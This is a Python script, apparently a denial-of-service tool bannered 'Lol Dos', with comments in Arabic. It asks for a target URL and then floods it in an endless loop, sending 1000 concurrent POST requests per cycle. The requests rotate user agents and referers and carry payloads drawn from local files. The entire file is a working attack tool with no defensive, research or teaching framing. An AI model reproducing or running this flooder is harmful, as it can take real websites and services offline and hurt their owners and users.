import aiohttp
import asyncio
import random
import string
import pyfiglet
from colorama import Fore, Style, init

init(autoreset=True)

# عرض الاسم بتنسيق ASCII art
ascii_banner = pyfiglet.figlet_format("Lol Dos")
print(Fore.RED + ascii_banner)

async def send_request(session, url):
    try:
        # إعداد بيانات الطلب
        data = generate_random_data()
        headers = generate_headers()
        async with session.post(url, data=data, headers=headers) as response:
            print(Fore.GREEN + "Request sent:", response.status)
            await asyncio.sleep(0.1)  # توزيع الطلبات بين الاستجابات
    except Exception as e:
        print(Fore.RED + "Error:", e)

def generate_user_agent():
    user_agents = load_file('user_agents.txt')
    return random.choice(user_agents)

def generate_headers():
    headers = {
        'User-Agent': generate_user_agent(),
        'Referer': random.choice(load_file('headers.txt')),
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive'
    }
    return headers

def generate_random_data():
    payloads = load_file('payloads.txt')
    if payloads:
        return random.choice(payloads).encode()
    else:
        # توليد بيانات عشوائية للطلب في حال عدم وجود payloads
        length = 100
        letters = string.ascii_letters + string.digits
        return ''.join(random.choice(letters) for _ in range(length)).encode()

def load_file(file_path):
    try:
        with open(file_path, 'r') as file:
            lines = file.read().splitlines()
        return lines
    except FileNotFoundError:
        print(Fore.YELLOW + f"No file found at {file_path}")
        return []

async def main():
    target_url = input("Enter the target URL: ")

    async with aiohttp.ClientSession() as session:
        while True:
            tasks = []
            for _ in range(1000):  # زيادة عدد الطلبات المرسلة في كل دورة
                task = send_request(session, target_url)
                tasks.append(task)
            await asyncio.gather(*tasks)

asyncio.run(main())
